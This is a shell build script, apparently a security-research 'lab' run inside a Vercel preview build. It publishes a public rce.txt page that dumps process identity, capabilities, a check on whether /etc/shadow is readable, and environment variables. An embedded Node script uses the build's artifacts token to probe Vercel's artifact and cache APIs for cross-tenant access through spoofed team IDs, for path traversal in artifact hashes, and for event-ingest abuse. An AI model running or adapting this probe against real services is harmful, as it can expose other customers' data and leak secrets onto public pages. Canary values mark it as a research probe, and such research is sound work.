#!/bin/sh
mkdir -p public
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > public/index.html
{
  echo "== who am i =="
  id
  uname -a
  echo "FAKEROOTKEY=${FAKEROOTKEY:-ABSENT}"
  grep -E '^(Uid|Gid|CapEff|Seccomp):' /proc/self/status
  echo -n "write to /root: "
  (touch /root/.lab-write-test && echo OK) || echo DENIED
  echo -n "read /etc/shadow: "
  (head -c 1 /etc/shadow >/dev/null 2>&1 && echo READABLE) || echo DENIED
  echo "LAB-NONCE: CANARY-8336db7bc74b6183"
  echo "VERCEL_ENV=${VERCEL_ENV:-unset}"
  echo "LAB_CANARY_A=${LAB_CANARY_A:-unset}"
  echo "LAB_PROD_ONLY=${LAB_PROD_ONLY:-unset}   (target=production only)"
  echo "TURBO_CACHE=${TURBO_CACHE:-unset}"
} > public/rce.txt
node -e '
const out = [];
const ep = process.env.VERCEL_API_ENDPOINT || "https://api.vercel.com";
const team = process.env.VERCEL_ARTIFACTS_OWNER || "";
const AT = process.env.VERCEL_ARTIFACTS_TOKEN || "";
const AH = { Authorization: "Bearer " + AT };
const nonce = "lab-" + Math.random().toString(36).slice(2, 10);
const foreign = "team_" + "z".repeat(24);
async function hit(label, method, url, opts) {
  const o = Object.assign({ method }, opts || {});
  try {
    const r = await fetch(url, o);
    let b = "";
    try { b = (await r.text()).slice(0, 220); } catch (e) {}
    out.push(method + " " + label + " -> HTTP " + r.status + (b ? " | " + b.replace(/\n/g, " ") : ""));
  } catch (e) { out.push(method + " " + label + " -> ERR " + String(e.message).slice(0, 60)); }
}
const put = (label, hash, qs) => hit(label, "PUT",
  ep + "/v8/artifacts/" + hash + (qs || ""),
  { headers: Object.assign({ "Content-Type": "application/octet-stream" }, AH),
    body: Buffer.from("LAB-ARTIFACT-CANARY-8336db7bc74b6183") });
(async () => {
  out.push("== A. tenant isolation: is teamId validated against the token? ==");
  out.push("  our team = " + team);
  await put("control: our teamId", nonce, "?teamId=" + team);
  await put("spoofed teamId", nonce + "-f", "?teamId=" + foreign);
  await put("no teamId param", nonce + "-n", "");
  await hit("status for foreign team", "GET", ep + "/v8/artifacts/status?teamId=" + foreign, { headers: AH });
  await hit("GET foreign-team artifact (does it exist?)", "GET",
    ep + "/v8/artifacts/" + nonce + "-f?teamId=" + foreign, { headers: AH });
  await hit("GET same artifact via OUR teamId", "GET",
    ep + "/v8/artifacts/" + nonce + "-f?teamId=" + team, { headers: AH });
  out.push("== B. key traversal: is the hash interpolated into the storage path? ==");
  await put("hash = ../shared/LABKEY", "..%2Fshared%2FLABKEY-" + nonce, "?teamId=" + team);
  await put("hash = ../../foreign/LABKEY", "..%2F..%2F" + foreign + "%2FLABKEY-" + nonce, "?teamId=" + team);
  await put("hash = absolute-ish path", "v2%2F" + team + "%2Fshared%2FLABKEY-" + nonce, "?teamId=" + team);
  out.push("== C. batch + event endpoints (quota / metrics abuse) ==");
  await hit("batch exists", "POST", ep + "/v8/artifacts?teamId=" + team,
    { headers: Object.assign({ "Content-Type": "application/json" }, AH),
      body: JSON.stringify({ hashes: [nonce, nonce + "-f", "deadbeef".repeat(8)] }) });
  await hit("events ingest", "POST", ep + "/v8/artifacts/events?teamId=" + team,
    { headers: Object.assign({ "Content-Type": "application/json" }, AH),
      body: JSON.stringify([{ hash: nonce, source: "LOCAL", duration: 999999, exitCode: 0 }]) });
  out.push("== D. suspense cache: write then read back ==");
  const raw = process.env.RUNTIME_CACHE_HEADERS || "{}";
  let hdrs = {};
  try { hdrs = JSON.parse(raw); } catch (e) {}
  const sce = process.env.RUNTIME_CACHE_ENDPOINT || "";
  const key = "labkey-" + nonce;
  if (sce) {
    await hit("POST " + key, "POST", sce + key,
      { headers: Object.assign({ "Content-Type": "application/json" }, hdrs),
        body: JSON.stringify({ value: "LAB-SUSPENSE-CANARY-8336db7bc74b6183" }) });
    await hit("GET " + key + " (read back)", "GET", sce + key, { headers: hdrs });
    await hit("POST with foreign domain in key", "POST", sce + "vercel-fork-rce-lab-boshjerns-projects.vercel.app/index.html",
      { headers: Object.assign({ "Content-Type": "application/json" }, hdrs),
        body: JSON.stringify({ value: "LAB-DOMAIN-PROBE" }) });
    await hit("POST with ?domain=prod", "POST", sce + key + "?domain=vercel-fork-rce-lab-boshjerns-projects.vercel.app",
      { headers: Object.assign({ "Content-Type": "application/json" }, hdrs),
        body: JSON.stringify({ value: "LAB-DOMAIN-Q" }) });
    await hit("GET root with ?key=", "GET", sce + "?key=" + key, { headers: hdrs });
  }
  require("fs").appendFileSync("public/rce.txt", "\n" + out.join("\n") + "\n");
})();
' 2>> public/rce.txt
sleep 9
cat public/rce.txt
